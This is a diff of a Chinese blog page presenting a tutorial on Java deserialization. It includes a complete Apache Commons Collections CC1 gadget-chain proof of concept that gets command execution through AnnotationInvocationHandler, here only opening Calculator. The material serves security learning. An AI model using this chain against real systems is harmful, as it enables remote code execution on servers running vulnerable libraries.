@@ -20,30 +20,54 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="ap@2022">
-<meta property="og:type" content="website">
+  <meta name="description" content="前言2015年，FoxGlove Security安全团队的@breenmachine发布了一篇长博客，里面详细阐述了利用java反序列化和Apache Commons  Collections这一基础类库实现远程命令执行。 该漏洞影响了诸多java web server，同时也开启了各种java反序列漏洞的大门。在此之后，Apache Commons Collections项目组也对存在漏洞的类">
+<meta property="og:type" content="article">
 <meta property="og:title" content="_ap">
-<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:url" content="http://example.com/2022/05/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8+%E4%B8%A4%E6%9D%A1%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="_ap">
-<meta property="og:description" content="ap@2022">
+<meta property="og:description" content="前言2015年，FoxGlove Security安全团队的@breenmachine发布了一篇长博客，里面详细阐述了利用java反序列化和Apache Commons  Collections这一基础类库实现远程命令执行。 该漏洞影响了诸多java web server，同时也开启了各种java反序列漏洞的大门。在此之后，Apache Commons Collections项目组也对存在漏洞的类">
 <meta property="og:locale">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22346635/1649450187493-8021bc24-9a40-42be-9571-afbf438c55e3.png#clientId=ud496a604-4a40-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=875&id=uc71abb39&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1750&originWidth=2880&originalType=binary&ratio=1&rotation=0&showTitle=false&size=653030&status=done&style=none&taskId=u4236fc62-27aa-4c6f-82ef-59a55b1f330&title=&width=1440">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22346635/1649452506422-ffe3a86b-54f3-41d9-8489-dced03874967.png#clientId=u1b6443e2-3b16-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=104&id=uc3da7993&margin=%5Bobject%20Object%5D&name=image.png&originHeight=208&originWidth=1110&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40613&status=done&style=none&taskId=ud9524650-2cd8-40f1-ac95-2b7a49e4ac6&title=&width=555">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22346635/1649453099328-a4a1fd94-5c3b-44d6-9d7a-b572e198bf3c.png#clientId=u03accfa5-67ad-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=58&id=u93a89d8d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=116&originWidth=1034&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23314&status=done&style=none&taskId=u9c8c6ddf-0808-4e87-bc3c-e9e112d4841&title=&width=517">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22346635/1649535390463-729f32a9-7473-477e-9cee-42d4101e3c88.png#clientId=ubc22b995-6e42-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=289&id=u22809fe9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=578&originWidth=526&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69002&status=done&style=none&taskId=u7ecee2c8-0442-4b4c-94c1-9a0bff23e64&title=&width=263">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22346635/1649451290579-64fe91f7-a29c-4970-bb09-95b54be08e20.png#clientId=u39b6669d-3b1d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=84&id=u7ff00762&margin=%5Bobject%20Object%5D&name=image.png&originHeight=168&originWidth=1098&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28564&status=done&style=none&taskId=u3e446716-3e1a-47ad-9188-772626d4e81&title=&width=549">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22346635/1649451467831-5ded5f0f-e064-4e20-a9fa-89e775c450be.png#clientId=u1eaee367-75fd-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=276&id=ue48e1f33&margin=%5Bobject%20Object%5D&name=image.png&originHeight=552&originWidth=1270&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76184&status=done&style=none&taskId=u1d61ac7f-3928-4f42-ae54-7e14aefd2e9&title=&width=635">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22346635/1649451548891-5bbfb75b-d899-477c-ae33-0ded740ff7cf.png#clientId=u1eaee367-75fd-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=381&id=FwWKs&margin=%5Bobject%20Object%5D&name=image.png&originHeight=762&originWidth=808&originalType=binary&ratio=1&rotation=0&showTitle=false&size=87606&status=done&style=none&taskId=u0df2efb3-ab99-49dc-a8c5-6c740f14a88&title=&width=404">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22346635/1649453944051-01afb504-8c35-4e86-83d4-3f061d0a6d2c.png#clientId=ud88a4407-aac9-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=88&id=u5314c91f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=176&originWidth=1032&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24398&status=done&style=none&taskId=u1036e4d5-c10d-42da-81a4-af59c6edc53&title=&width=516">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22346635/1649172784313-862611dd-cbe4-409a-89a5-663cd0da2340.png#clientId=u55605a4f-3410-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=900&id=u8f2225b3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1800&originWidth=2880&originalType=binary&ratio=1&rotation=0&showTitle=false&size=502404&status=done&style=none&taskId=ue96f2642-3f45-4cd1-a863-be4365f237f&title=&width=1440">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22346635/1649454325443-a5b3f4d3-611d-4d4b-909b-d2f935dcaa50.png#clientId=u7080c130-c8c5-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=73&id=ud0394950&margin=%5Bobject%20Object%5D&name=image.png&originHeight=146&originWidth=1140&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24445&status=done&style=none&taskId=ua84fa8ee-6f67-449d-bf0e-124f37a0c2f&title=&width=570">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22346635/1649174775659-e4d663c3-c4a0-41f2-ad73-0f8180b35592.png#clientId=u66cd8513-d913-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=900&id=ua34d1b39&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1800&originWidth=2880&originalType=binary&ratio=1&rotation=0&showTitle=false&size=486611&status=done&style=none&taskId=ua7adbce0-8bcc-43ab-8b2b-9c9d2efc1b9&title=&width=1440">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22346635/1649174751093-6b074486-0ca1-41a0-813c-067d550f7be2.png#clientId=u66cd8513-d913-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=671&id=ua2ba52b8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1342&originWidth=1796&originalType=binary&ratio=1&rotation=0&showTitle=false&size=143776&status=done&style=none&taskId=u5272c634-dbf1-4173-8512-e6bbec75675&title=&width=898">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22346635/1649536422894-29f8c4be-b620-43a1-9c84-70ef83cd62cc.png#clientId=u2c5f1897-9923-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=256&id=u44aff561&margin=%5Bobject%20Object%5D&name=image.png&originHeight=512&originWidth=1052&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76660&status=done&style=none&taskId=uc9b20912-bd9f-4401-8bec-cd233e527a1&title=&width=526">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22346635/1649348540566-7f56136f-e2f9-4a71-91f2-d1ac3b99ddba.png#clientId=u72b4690e-777e-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=278&id=ua4b2939e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=556&originWidth=1386&originalType=binary&ratio=1&rotation=0&showTitle=false&size=127764&status=done&style=none&taskId=u26fe3893-d16c-41cc-8343-1735ba7da65&title=&width=693">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22346635/1649348850697-58eb7be1-ff0a-46de-b1e6-f497eca8c727.png#clientId=u72b4690e-777e-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=333&id=u178a44cd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=666&originWidth=2860&originalType=binary&ratio=1&rotation=0&showTitle=false&size=302590&status=done&style=none&taskId=u09240292-09b8-44ea-9122-b6d5e68719e&title=&width=1430">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22346635/1649537700103-3e482177-65e2-431b-9bfe-3604e5261286.png#clientId=u905474b5-8b82-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=67&id=Eaqbt&margin=%5Bobject%20Object%5D&name=image.png&originHeight=134&originWidth=782&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22313&status=done&style=none&taskId=u4893442a-1e62-48bc-9dcf-801a085afb8&title=&width=391">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22346635/1649537905913-90de9003-6e32-483d-89b3-8ae64e875247.png#clientId=u905474b5-8b82-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=114&id=u887033d6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=228&originWidth=1472&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43438&status=done&style=none&taskId=u921ba88f-c23f-413e-9fe2-b9c12b9e8e2&title=&width=736">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22346635/1649538443627-c356185a-7111-4a4c-824f-1b730f4d7b02.png#clientId=ub18f1044-917a-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=183&id=ucd5205c6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=366&originWidth=2784&originalType=binary&ratio=1&rotation=0&showTitle=false&size=160219&status=done&style=none&taskId=u48653dd6-3af9-40c4-9050-53d037fd33d&title=&width=1392">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22346635/1649539029939-1555f512-07fe-413e-80b1-b4cef4534c69.png#clientId=ua8b0e5cd-52fc-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=214&id=uf1b8a504&margin=%5Bobject%20Object%5D&name=image.png&originHeight=428&originWidth=2794&originalType=binary&ratio=1&rotation=0&showTitle=false&size=179117&status=done&style=none&taskId=u1db0f225-dc6a-43de-87c0-71075b47bb2&title=&width=1397">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22346635/1649354357798-9ccde84a-3ee6-4890-b07e-536d6e17ff30.png#clientId=u72b4690e-777e-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=308&id=u9c2c080e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=616&originWidth=1618&originalType=binary&ratio=1&rotation=0&showTitle=false&size=150006&status=done&style=none&taskId=u17f9f219-b869-40a9-a0a9-6066fb13a5b&title=&width=809">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/22346635/1649540651102-cd2912f4-decf-40f6-a0b2-c09dfa2b62e5.png#clientId=uf518652f-2428-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=875&id=ud80d168b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1750&originWidth=2880&originalType=binary&ratio=1&rotation=0&showTitle=false&size=847660&status=done&style=none&taskId=u93b1b498-48e5-447d-a71a-3e93f0f5463&title=&width=1440">
+<meta property="article:published_time" content="2022-05-03T07:27:43.577Z">
+<meta property="article:modified_time" content="2022-05-03T07:27:43.733Z">
 <meta property="article:author" content="ap">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2022/png/22346635/1649450187493-8021bc24-9a40-42be-9571-afbf438c55e3.png#clientId=ud496a604-4a40-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=875&id=uc71abb39&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1750&originWidth=2880&originalType=binary&ratio=1&rotation=0&showTitle=false&size=653030&status=done&style=none&taskId=u4236fc62-27aa-4c6f-82ef-59a55b1f330&title=&width=1440">
 
-<link rel="canonical" href="http://example.com/">
+<link rel="canonical" href="http://example.com/2022/05/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8+%E4%B8%A4%E6%9D%A1%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-Hans'
   };
 </script>
 
-  <title>_ap</title>
+  <title> | _ap</title>
   
 
 
@@ -175,96 +199,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/06/220806-%E6%97%A5%E8%AE%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/Avatar/ava.jpg">
-      <meta itemprop="name" content="ap">
-      <meta itemprop="description" content="ap@2022">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="_ap">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/08/06/220806-%E6%97%A5%E8%AE%B0/" class="post-title-link" itemprop="url">220806-日记</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-08-06 16:09:49 / Modified: 16:10:36" itemprop="dateCreated datePublished" datetime="2022-08-06T16:09:49+08:00">2022-08-06</time>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine: </span>
-    
-    <a title="valine" href="/2022/08/06/220806-%E6%97%A5%E8%AE%B0/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2022/08/06/220806-%E6%97%A5%E8%AE%B0/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  <br>
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>8</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>1 mins.</span>
-            </span>
-
-        </div>
-      </header>
 
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>热死了 还好有风扇</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
@@ -280,10 +218,9 @@
       <meta itemprop="name" content="_ap">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
+        <h1 class="post-title" itemprop="name headline">
           
-            <a href="/2022/05/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8+%E4%B8%A4%E6%9D%A1%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -296,6 +233,13 @@
             </span>
 
           
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
   
   <span class="post-meta-item">
     
@@ -334,7 +278,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2015年，FoxGlove Security安全团队的@breenmachine发布了一篇长博客，里面详细阐述了利用java反序列化和Apache Commons  Collections这一基础类库实现远程命令执行。</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2015年，FoxGlove Security安全团队的@breenmachine发布了一篇长博客，里面详细阐述了利用java反序列化和Apache Commons  Collections这一基础类库实现远程命令执行。</p>
 <p>该漏洞影响了诸多java web server，同时也开启了各种java反序列漏洞的大门。在此之后，Apache Commons Collections项目组也对存在漏洞的类库进行了一定的安全处理，目前存在缺陷的版本是Apache Commons Collections 3.2.1以下。</p>
 <h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>java中执行系统命令使用<code>java.lang.Runtime</code>类的<code>exec</code>方法<br>如下函数可以在macos中弹出计算器</p>
 <blockquote>
@@ -433,27 +377,37 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.chaitin.CC1test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.chaitin.Serialization;</span><br><span class="line"><span class="keyword">import</span> com.chaitin.Unserialization;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span></span><br><span class="line">            NoSuchMethodException,</span><br><span class="line">            InvocationTargetException,</span><br><span class="line">            IllegalAccessException, ClassNotFoundException, IOException, InstantiationException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a /System/Applications/Calculator.app&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 一个键值对就是一个Entry</span></span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;v&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">                hashMap,</span><br><span class="line">                <span class="literal">null</span>,</span><br><span class="line">                chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 先获取类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// 再取构造器</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// 确保可访问</span></span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 为了走进readObject的第一个if判断：必须将注解调用控制器构造器的构造方法参数设置为含有成员变量的类</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line">        Serialization.serialize(o);</span><br><span class="line">        Unserialization.unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 <p>实现效果<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22346635/1649540651102-cd2912f4-decf-40f6-a0b2-c09dfa2b62e5.png#clientId=uf518652f-2428-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=875&id=ud80d168b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1750&originWidth=2880&originalType=binary&ratio=1&rotation=0&showTitle=false&size=847660&status=done&style=none&taskId=u93b1b498-48e5-447d-a71a-3e93f0f5463&title=&width=1440" alt="image.png"></p>
 
-      
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2022/08/06/220806-%E6%97%A5%E8%AE%B0/" rel="next" title="220806-日记">
+      220806-日记 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
       </footer>
+    
   </article>
   
   
   
 
 
-  
-
-
 
           </div>
           
+    <div class="comments" id="valine-comments"></div>
 
 <script>
   window.addEventListener('tabs:register', () => {
@@ -500,6 +454,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">2.1.</span> <span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#java%E5%8F%8D%E5%B0%84"><span class="nav-number">2.2.</span> <span class="nav-text">java反射</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%B0%84"><span class="nav-number">2.2.1.</span> <span class="nav-text">什么是反射</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%8F%8D%E5%B0%84"><span class="nav-number">2.2.2.</span> <span class="nav-text">为什么要反射</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E5%8F%8D%E5%B0%84%E8%8E%B7%E5%8F%96%E7%B1%BB%E5%AF%B9%E8%B1%A1"><span class="nav-number">2.2.3.</span> <span class="nav-text">通过反射获取类对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E5%8F%8D%E5%B0%84%E5%88%9B%E5%BB%BA%E7%B1%BB%E5%AF%B9%E8%B1%A1"><span class="nav-number">2.2.4.</span> <span class="nav-text">通过反射创建类对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%B1%BB%E5%B1%9E%E6%80%A7"><span class="nav-number">2.2.5.</span> <span class="nav-text">获取类属性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AF%B9%E8%B1%A1%E6%96%B9%E6%B3%95"><span class="nav-number">2.2.6.</span> <span class="nav-text">获取对象方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="nav-number">2.2.7.</span> <span class="nav-text">动态代理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.3.</span> <span class="nav-text">java序列化和反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0"><span class="nav-number">2.3.1.</span> <span class="nav-text">反序列化的操作函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-number">2.3.2.</span> <span class="nav-text">反序列化漏洞成因</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%8E%E4%B9%88%E6%89%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-number">2.3.3.</span> <span class="nav-text">怎么找反序列化利用链</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-URLDNS%E9%93%BE"><span class="nav-number">3.</span> <span class="nav-text">java反序列化-URLDNS链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%8E%E4%B9%88%E5%8F%91%E7%8E%B0%E7%9A%84"><span class="nav-number">3.1.</span> <span class="nav-text">怎么发现的</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 